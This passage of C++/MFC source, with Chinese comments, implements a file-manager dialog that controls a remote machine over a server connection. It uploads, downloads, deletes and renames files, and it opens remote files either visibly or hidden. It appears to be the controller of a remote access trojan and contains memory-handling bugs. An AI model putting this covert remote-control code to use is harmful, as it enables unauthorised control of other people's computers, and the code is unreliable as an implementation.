	m_nOperatingFileLength = 0;
	
	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		ShowMessage("远程：装载目录 %s\\*.* 完成", m_Remote_Path);
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(5);
		SendUploadJob();
	}
	return;
}

void CFileManagerDlg::EndRemoteDeleteFile()
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		ShowMessage("远程：装载目录 %s\\*.* 完成", m_Remote_Path);
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(5);
		SendDeleteJob();
	}
	return;
}


void CFileManagerDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::SendContinue()
{
	BYTE	bBuff = COMMAND_CONTINUE;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::SendStop()
{
	BYTE	bBuff = COMMAND_STOP;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::ShowProgress()
{
	char	*lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = "传送文件";
	else
		lpDirection = "接收文件";

	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}

	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;
	ShowMessage("%s %s %dKB (%d%%)", lpDirection, m_strOperatingFile, (int)(m_nCounter / 1024), progress);
	m_ProgressCtrl->SetPos(progress);

	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// 关闭文件句柄
	}
}

void CFileManagerDlg::OnLocalDelete()
{
	m_bIsUpload = true;
	CString str;
	if (m_list_local.GetSelectedCount() > 1)
		str.Format("确定要将这 %d 项删除吗?", m_list_local.GetSelectedCount());
	else
	{
		CString file = m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
		if (m_list_local.GetItemData(m_list_local.GetSelectionMark()) == 1)
			str.Format("确实要删除文件夹“%s”并将所有内容删除吗?", file);
		else
			str.Format("确实要把“%s”删除吗?", file);
	}
	if (::MessageBox(m_hWnd, str, "确认删除", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;

	EnableControl(FALSE);

	POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			DeleteDirectory(file);
		}
		else
		{
			DeleteFile(file);
		}
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
	// 禁用文件管理窗口
	EnableControl(TRUE);

	FixedLocalFileList(".");
}

void CFileManagerDlg::OnRemoteDelete() 
{
	m_bIsUpload = false;
	// TODO: Add your command handler code here
	CString str;
	if (m_list_remote.GetSelectedCount() > 1)
		str.Format("确定要将这 %d 项删除吗?", m_list_remote.GetSelectedCount());
	else
	{
		CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
		if (m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
			str.Format("确实要删除文件夹“%s”并将所有内容删除吗?", file);
		else
			str.Format("确实要把“%s”删除吗?", file);
	}
	if (::MessageBox(m_hWnd, str, "确认删除", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	m_Remote_Delete_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_remote.GetItemData(nItem))
			file += '\\';

		m_Remote_Delete_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	EnableControl(FALSE);
	// 发送第一个下载任务
	SendDeleteJob();
}

void CFileManagerDlg::OnRemoteStop() 
{
	// TODO: Add your command handler code here
	m_bIsStop = true;
}

void CFileManagerDlg::OnLocalStop() 
{
	// TODO: Add your command handler code here
	m_bIsStop = true;
}

void CFileManagerDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CFileManagerDlg::SendTransferMode()
{
	CFileTransferModeDlg	dlg(this);
	dlg.m_strFileName = m_strUploadRemoteFile;
	switch (dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_ADDITION:
		m_nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case IDC_ADDITION_ALL:
		m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
		break;
	case IDC_JUMP:
		m_nTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDC_CANCEL:
		m_nTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = true;
		EndLocalUploadFile();
		return;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, (unsigned char *)&bToken, sizeof(bToken));
}

void CFileManagerDlg::SendFileData()
{
	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	ShowProgress();

	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)
	{
		EndLocalUploadFile();
		return;
	}

	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，数据
	lpBuffer[0] = COMMAND_FILE_DATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
	// 返回值
	bool	bRet = true;
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
	LocalFree(lpBuffer);
}


bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

void CFileManagerDlg::OnLocalNewfolder() 
{
	if (m_Local_Path == "")
		return;
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("新建目录"), _T("请输入目录名称:"), this);

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		// 创建多层目录
		MakeSureDirectoryPathExists(m_Local_Path + dlg.m_str + "\\");
		FixedLocalFileList(".");
	}
}

void CFileManagerDlg::OnRemoteNewfolder() 
{
	if (m_Remote_Path == "")
		return;
	// TODO: Add your command handler code here
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("新建目录"), _T("请输入目录名称:"), this);

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_str + "\\";
		UINT	nPacketSize = file.GetLength() + 2;
		// 创建多层目录
		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
}

void CFileManagerDlg::OnTransfer()
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalCopy();
	}
	else
	{
		OnRemoteCopy();
	}
}

void CFileManagerDlg::OnRename() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		m_list_local.EditLabel(m_list_local.GetSelectionMark());
	}
	else
	{
		m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
	}	
}

void CFileManagerDlg::OnEndlabeleditListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here


	CString str, strExistingFileName, strNewFileName;
	m_list_local.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Local_Path + str;
	*pResult = ::MoveFile(strExistingFileName.GetBuffer(0), strNewFileName.GetBuffer(0));
}

void CFileManagerDlg::OnEndlabeleditListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here
	CString str, strExistingFileName, strNewFileName;
	m_list_remote.GetEditControl()->GetWindowText(str);
	
	strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Remote_Path + str;
	
	if (strExistingFileName != strNewFileName)
	{
		UINT nPacketSize = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_RENAME_FILE;
		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
		memcpy(lpBuffer + 2 + strExistingFileName.GetLength(), 
			strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
	*pResult = 1;
}

void CFileManagerDlg::OnDelete() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalDelete();
	}
	else
	{
		OnRemoteDelete();
	}		
}

void CFileManagerDlg::OnNewfolder() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalNewfolder();
	}
	else
	{
		OnRemoteNewfolder();
	}		
}

void CFileManagerDlg::OnRefresh() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		FixedLocalFileList(".");
	}
	else
	{
		GetRemoteFileList(".");
	}		
}

void CFileManagerDlg::OnLocalOpen() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Local_Path + m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
	ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOW);
}

void CFileManagerDlg::OnRemoteOpenShow() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int		nPacketLength = str.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete [] lpPacket;	
}

void CFileManagerDlg::OnRemoteOpenHide() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
	
	int		nPacketLength = str.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete [] lpPacket;
}

void CFileManagerDlg::OnRclickListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CListCtrl	*pListCtrl = &m_list_local;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(6, MF_BYPOSITION);
	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; ++i)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// 是文件夹
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);
		else
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);


	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;
}

void CFileManagerDlg::OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	int	nRemoteOpenMenuIndex = 5;
	CListCtrl	*pListCtrl = &m_list_remote;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);
	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; ++i)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// 是文件夹
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION| MF_GRAYED);
		else
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);
	
	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;
}

bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}
